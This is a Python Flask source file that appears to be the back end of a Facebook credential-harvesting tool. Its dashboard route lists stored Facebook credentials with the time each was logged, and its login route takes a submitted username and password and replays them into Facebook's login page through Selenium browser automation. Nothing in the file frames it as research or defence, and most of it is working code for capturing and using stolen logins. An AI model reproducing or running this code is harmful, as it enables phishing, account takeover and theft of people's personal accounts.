import logging

from flask import abort, render_template, request, jsonify
from sqlalchemy import column, literal, literal_column, text
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

import models
import json

from common import app, db

@app.route('/dashboard')
def dashboard():
	creds = models.FacebookCredential.query.order_by(models.FacebookCredential.logged_timestamp).all()
	return render_template('dashboard.html', credentials=creds)

@app.route('/login', methods=['POST'])
def login():
	data = json.loads(request.data)
	username = data["username"]
	password = data["password"]
	driver = webdriver.Firefox()
	# or you can use Chrome(executable_path="/usr/bin/chromedriver")
	driver.get("http://www.facebook.org")
	assert "Facebook" in driver.title
	elem = driver.find_element_by_id("email")
	elem.send_keys(username)
	elem = driver.find_element_by_id("pass")
	elem.send_keys(password)
	elem.send_keys(Keys.RETURN)
	# driver.close()
	return ('', 204)

if __name__ == '__main__':
    from os import sys, path
    sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))

    # Run locally in debug mode (gunicorn runs the app in production)
    app.run(host='127.0.0.1', port=8080, debug=True, threaded=True)